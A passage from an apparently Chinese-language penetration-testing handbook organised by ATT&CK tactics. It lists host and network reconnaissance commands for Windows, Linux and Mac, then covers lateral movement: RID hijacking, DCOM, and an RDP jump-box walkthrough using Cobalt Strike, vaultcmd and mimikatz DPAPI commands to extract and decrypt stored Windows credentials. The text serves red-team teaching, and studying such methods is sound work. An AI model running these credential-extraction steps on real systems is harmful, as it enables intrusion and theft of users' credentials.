>
> rem reg query 命令从Registry 键获取值
HKEYLOCALMACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninst
all 检查系统上安装的软件
## 远程系统查看
Windows：
-   net view //当前域的计算机列表
-   net view /domain //查看所有域
-   C:\\Windows\\System32\\Drivers\\etc\\hosts
-   ping 命令Mac:
ping 命令
/etc/hosts linux： ping 命令etc/hosts
![](media/image337.jpeg){width="5.788803587051619in"
height="1.9499989063867016in"}
## 安全软件查看 {#安全软件查看-1}
netsh 命令
如：netsh advfirewall firewall //查看防火墙设置
![](media/image338.jpeg){width="5.788312554680665in" height="3.0in"}
reg query dir tasklist /v
查看一些目录像C:\\Program\\Files\\
## 系统信息查看 {#系统信息查看-1}
Windows：
ver //当前使用系统的版本
![](media/image339.jpeg){width="5.827785433070866in"
height="0.9866666666666667in"}
systeminfo
![](media/image340.jpeg){width="5.800238407699037in"
height="3.359166666666667in"}
gpresult
![](media/image341.jpeg){width="5.741067366579178in"
height="2.6704166666666667in"}
![](media/image342.jpeg){width="5.812413604549431in"
height="4.120416666666666in"}
hostname //查看主机名
![](media/image343.jpeg){width="5.851910542432196in" height="1.3125in"}
date /t //查看系统日期
![](media/image344.jpeg){width="5.778900918635171in"
height="1.0616666666666668in"}
net config workstation
![](media/image345.jpeg){width="5.824166666666667in" height="2.50125in"}
set //显示、设置或删除cmd.exe 环境变量
![](media/image346.jpeg){width="5.8717771216097985in"
height="2.86375in"}
HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum
//获取构建标识符以及受害者硬盘驱动器信息
![](media/image347.jpeg){width="5.835945975503062in"
height="0.9304166666666667in"}
Linux：
ls -la /Applications //收集安装的应用程序 目录是Application cat
/proc/cpuinfo \| grep -c \"cpu family\" 2\>&1 命令收集系统信息
![](media/image348.jpeg){width="5.847807305336833in"
height="2.1145833333333335in"}
Mac:
systemsetup //查看系统的详细分类，需要管理权限system_profiler
//配置部分，无需权限
## 系统网络设置查看 {#系统网络设置查看-1}
Windows： ipconfig /all
![](media/image349.jpeg){width="4.910830052493439in"
height="2.970624453193351in"}
arp -a
![](media/image350.jpeg){width="5.79919072615923in" height="1.48625in"}
route print //打印路由
![](media/image351.jpeg){width="5.848292869641295in"
height="4.0720833333333335in"}
getmac //获取mac 地址
![](media/image352.jpeg){width="5.7986745406824145in"
height="0.90625in"}
netsh interface show //发现网络接口设置
![](media/image353.jpeg){width="5.863969816272966in"
height="1.9937489063867018in"}
nbtstat -n
![](media/image354.jpeg){width="5.83540791776028in"
height="2.735832239720035in"}
nbtstat -s
![](media/image355.jpeg){width="5.78125in" height="1.5725in"}
Linux:
ifconfig
## 系统网络链接查看 {#系统网络链接查看-1}
Windows:
net use
![](media/image356.jpeg){width="5.829387576552931in"
height="1.5389577865266841in"}
net session //查询会话
![](media/image357.jpeg){width="5.814431321084864in" height="1.66625in"}
netstat -ano
![](media/image358.jpeg){width="4.639329615048119in"
height="2.482083333333333in"}
Mac/Linux： netstat -ano
lsof //查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)
who -a
w
![](media/image359.jpeg){width="5.8132874015748035in"
height="0.48333333333333334in"}
## 系统管理员/用户查看
Windows: whoami
![](media/image360.jpeg){width="5.810810367454068in"
height="1.0799989063867017in"}
query user
![](media/image361.jpeg){width="5.851676509186352in"
height="0.5316655730533684in"}
Mac: user/w/who Linux： w/who
## 系统服务查看 {#系统服务查看-1}
tasklist /svc
![](media/image362.jpeg){width="5.823829833770779in"
height="3.830416666666667in"}
net start
![](media/image363.jpeg){width="5.121340769903762in"
height="3.261874453193351in"}
sc query
![](media/image364.jpeg){width="5.862984470691163in" height="2.71875in"}
## 系统时间查看 {#系统时间查看-1}
net time
![](media/image365.jpeg){width="5.828308180227472in"
height="1.3518744531933509in"}
net time \\\\computername
![](media/image366.jpeg){width="5.7461165791776025in"
height="1.123957786526684in"}
# 八.横向渗透 (TA0008)
横向移动包括使对手能够访问和控制网络上的远程系统的技术，并且可以但不一定包括在远程系统上执行工具。横向移动技术可以允许对手从系统收集信息而无需额外的工具，例如远程访问工具。
## ![](media/image367.png){width="5.750643044619423in" height="5.773645013123359in"}RID 劫持(hash 传递) (T1075)
![](media/image368.png){width="5.829348206474191in"
height="4.876666666666667in"}
参考资料：https://github.com/r4wd3r/RID-Hijacking
https://r4wsecurity.blogspot.com/2017/12/rid-hijacking-maintaining-
access-on.html
内含视频 :
https://[www.ggsec.cn/rid-hijack.html](http://www.ggsec.cn/rid-hijack.html)
## ![](media/image369.png){width="5.8013987314085735in" height="7.720833333333333in"}Windows 分布式组件对象模型DCOM (T1175)
参考资料 ：https://zhuanlan.kanxue.com/article-4866.htm
视频内容
：https://[www.ggsec.cn/DCOM.html](http://www.ggsec.cn/DCOM.html)
## 利用 RDP 跳跃网络隔离
遇到陌生领域的知识，先别管它什么意思。首要任务是提取出对象，再关注它们的逻辑关系，形成知识网络。
所有知识它都有一个共性，首先是有什么，然后是跟你讲故事，告诉你它们都怎么了。
现实举例：什么是角膜？角膜就是人们俗称的\"黑眼珠\"，位于眼球的正前方，形似圆球体的半透明部分。
就是角膜，黑眼珠，眼球正前方。 这样就简洁 高效 容易理解了。
前提是配合原文一起体会。
> 不管我们使用什么方法和心得，目的都是理解他说的啥意思，才能进一步学习。当此法不能帮助你理解性的提升时，请留神，哪里存在问题了。
让我们来进一步讨论这种学习方式，本文才用资料为，渗透测试中的攻击步骤，横移中的一个案例，请见文末参考资料：利用RDP
跳跃网络隔离
所谓横移就是，钱在主卧室，你从厕所进去的。怎么从厕所到主卧室，就是横移。
-   阅读介绍
网络拓扑：jump box secret network 工作站 RDP 互联网 攻击者
局域网 10.0.0.0/16 rasta-lan.local 秘密网 172.16.0.0/24 secret-lan.local
攻击者通过互联网到工作站，从工作站用远程桌面到jump
box，再用远程到秘密网络
-   阅读假设违反
查询哪些用户/组有RDP 权限 Jump Box Users
> powerpick Get-NetLocalGroup -ComputerName RDP01 -GroupName \"Remote
> Des ktop Users\"
查询一下Jump Box Users 的成员名字
> powerpick Get-NetGroupMember -GroupName \"Jump Box Users\"
>
> rastamouseJumpBoxUsersMemberNamerastamouse_adm
>
> 根据以上知识结晶，就可以配合原文的理解，编制一下自己的知识网络了：攻击者通过互联网进入工作站首先有一个rastamouse账户，在该账户下运行命令，查出
> JumpBoxUsers组有RDP权限，再查该组还有什么成员，得到
> rastamouseadm。那么我们就需要从rastamouse_adm 的账户进行RDP
> 进入下一步。
-   凭证管理和DPAPI 查询凭证
> shell vaultcmd /listcreds:\"Windows Credentials\" /all
凭据存储在users
目录中C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\*
查询它们
> powerpick Get-ChildItem
> C:\\Users\\rasta_mouse\\AppData\\Local\\Microsoft\\Creden tials\\
> -Force
再查第一条结果
> mimikatz dpapi::cred
> /in:C:\\Users\\rasta_mouse\\AppData\\Local\\Microsoft\\Credenti
> als\\2647629F5AA74CD934ECD2F88D64ECD0
>
> pbData guidMasterKey 加密数据和解密需要的关键数据LSASS
> SeDebugPrivilege 缓存密钥与SeDeDebug 权限mimikatz !sekurlsa::dpapi
拿到guidMasterKey
Cobalt Strike 运行mimikatz 的兼容性表现不佳，手动使用它解密
> mimikatz dpapi::cred
> /in:C:\\Users\\rasta_mouse\\AppData\\Local\\Microsoft\\Credenti
> als\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8
> b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c47
>
> 0d91d21016311727bce2eff9c97445d444b6a17b
-   RDP01